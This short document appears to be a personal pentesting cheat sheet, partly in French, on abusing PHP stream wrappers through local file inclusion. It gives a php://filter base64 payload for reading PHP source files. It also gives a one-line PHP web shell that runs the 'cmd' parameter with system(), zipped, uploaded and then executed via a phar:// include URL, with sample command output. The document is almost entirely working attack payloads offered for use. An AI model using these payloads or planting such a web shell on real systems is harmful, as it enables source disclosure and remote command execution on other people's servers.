# PHP WRAPPER

## FILTER

Lire un fihier php via LFI: 

	php://filter/convert.base64-encode/resource=file
	
## PHAR-ZIP

- Setup :

vim shell.php

```php
<?php 
	system($_GET['cmd']); 
?>
```

zip shell.zip shell.php

We upload the zip file

--> url?file=shell.zip

- Exploit :

--> url?file=phar://shell.zip/shell.php&cmd=ls

file1
file2
file3
